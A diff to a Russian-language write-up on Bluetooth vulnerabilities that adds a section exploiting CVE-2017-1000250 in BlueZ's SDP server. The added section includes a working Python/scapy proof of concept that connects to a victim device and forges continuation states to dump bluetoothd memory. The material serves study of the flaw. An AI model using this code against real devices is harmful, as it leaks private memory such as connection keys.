@@ -252,7 +252,7 @@ TODO: code + conclusions
 --------------------------------------
 #### Обзор SDP
 
-Назначение протокола **SDP** (**service discovery protocol**) заключается в том, чтобы позволять устройствам Bluetooth понимать, какие сервисы и приложения поддерживают Bluetooth. Использует клиент-серверную модель.
+Назначение протокола **SDP** (**service discovery protocol**) заключается в том, чтобы позволять устройствам Bluetooth понимать, какие сервисы и приложения (или устройства вокруг) поддерживают Bluetooth. Использует клиент-серверную модель.
 
 Для того, чтобы получить информацию об определенном сервисе, *SDP клиент* посылает **SDP-запрос** *SDP-серверу* и ожидает **SDP-ответ**. Для этого процесса **SDP** определяет особый механизм фрагментации (**SDP-continuation**). Он состоит в следующем:
 - *SDP клиент* посылает *SDP-запрос*
@@ -317,3 +317,93 @@ cstate->cStateValue.maxBytesSent);
 BlueZ стек разбит на две части, одна из которых работает на *уровне ядра* (отрывок был рассмотрен в уязвимости **L2CAP**), вторая - на *пользовательском уровне*. Процесс *bluetoothd* как раз содержит последнюю часть и контролирует критически важные данные (например ключи шифрования Bluetooth-соединений), которые могут быть получены при эксплуатации данной уязвимости. Данная утечка очень напоминает **Heartbleed (CVE-2014-0160)** - ошибку в криптографическом программном обеспечении *OpenSSL*, позволяющую несанкционированно читать память на сервере или на клиенте, в том числе для извлечения закрытого ключа сервера.
 
 #### Эксплуатация уязвимости CVE-2017-1000250
+Данный пример на языке python для простоты показывает только, как можно получить данные за пределами выделенного буфера, никак при этом их не используя.
+
+Определим сначала нужные структуры данных (в классе scapy.packet.Packet уже определены специальные методы и поля для удобного конструирования пакетов):
+```python
+# собственная реализация Bluez continuation state 
+# (приведена в разделе выше)
+class BlueZ_ContinuationState(Packet):
+    fields_desc = [
+        LEIntField("timestamp", 0),
+        LEShortField("maxBytesSent", 0),
+        LEShortField("lastIndexSent", 0),
+    ]
+
+# собственная реализация SDP-запроса поиска поддерживаемых сервисов
+# содержит id необходимого нам сервиса и список параметров,
+# которые требуется от него получить
+class SDP_ServiceSearchAttributeRequest(Packet):
+    fields_desc = [
+        # id SDP протокола
+        ByteField("pdu_id",0x06),
+        # id транзакции
+        ShortField("transaction_id", 0x00),
+        # длина параметров
+        ShortField("param_len", 0),
+        # id сервиса/сервисов
+        FieldListField("search_pattern", 0x00, ByteField("", None)),
+        # максимальное количество байтов, которое хотим получить в ответе
+        ShortField("max_attr_byte_count", 0),
+        # список параметров
+        FieldListField("attr_id_list", 0x00, ByteField("", None)),
+        # длина continuation state 
+        ByteField("cont_state_len", 0),
+    ]
+```
+Установим **L2CAP** соединение и согласуем значение **MTU**. Так как относительно **SDP** это низлежащий протокол, воспользуемся готовой реализацией  **L2CAP** из python-библиотеки *bluetooth*:
+```python
+# получим BD_ADDR (MAC-aдрес устройства жертвы) из аргументов
+# выберем значение MTU как 512 байтов 
+target = sys.argv[1]
+mtu = 512
+
+# создадим L2CAP-сокет и установим соединение
+print("Connecting L2CAP socket...")
+sock = bluetooth.BluetoothSocket(bluetooth.L2CAP)
+bluetooth.set_l2cap_mtu(sock, mtu)
+sock.connect((target, 1))
+```
+Отправим первый *SDP-пакет* для получения метки времени на устройстве-жертвы:
+```python
+# search-pattern и attr_id_list такие для примера
+# изменяя эти значения, можно получать данные от различных Bluetooth-сервисов
+req1 = SDP_ServiceSearchAttributeRequest(search_pattern = [0x35, 0x03, 0x19, 0x01, 0x00],
+                            attr_id_list = [0x35, 0x05, 0x0a, 0x00, 0x00, 0x00, 0x01],
+                            max_attr_byte_count = 10)
+sock.send(bytes(req1))
+resp1 = sock.recv(mtu)
+
+# обработка полученного continuation-state
+cont_state = resp1[-8:]
+host_timestamp = int.from_bytes(cont_state[:4], byteorder = 'little')
+print("Extracted timestamp:", hex(host_timestamp))
+```
+После этого отправляем *SDP-пакеты* с подмененным **continuation-state**:
+```python
+received_data = b''
+offset = 65535
+
+print("Dumping", offset, "bytes of memory...")
+while offset > 0:
+    print("Sending SDP req, offset:", offset)
+    req2 = SDP_ServiceSearchAttributeRequest(search_pattern = [0x35, 0x03, 0x19, 0x01, 0x00],
+                                attr_id_list = [0x35, 0x05, 0x0a, 0x00, 0x00, 0x00, 0x01],
+                                max_attr_byte_count = 65535)
+    # подмена continuation-state (используется подмена поля maxBytesSent)
+    # за счет такой подмены двигаем границы передаваемого нам буфера
+    forged_cont_state = BlueZ_ContinuationState(timestamp = host_timestamp, 
+                                maxBytesSent = offset) 
+    # записываем в пакет подмененное continuation-state
+    req2 = req2 / forged_cont_state
+    # отправляем пакет
+    sock.send(bytes(req2))
+
+    data = sock.recv(mtu)
+    data = data[7:] # убираем SDP параметры
+    data = data[:-9] # убираем continuation state
+    received_data = data + received_data
+    offset -= len(data) if len(data) > 0 else 1
+
+print(hexdump(received_data))
+```
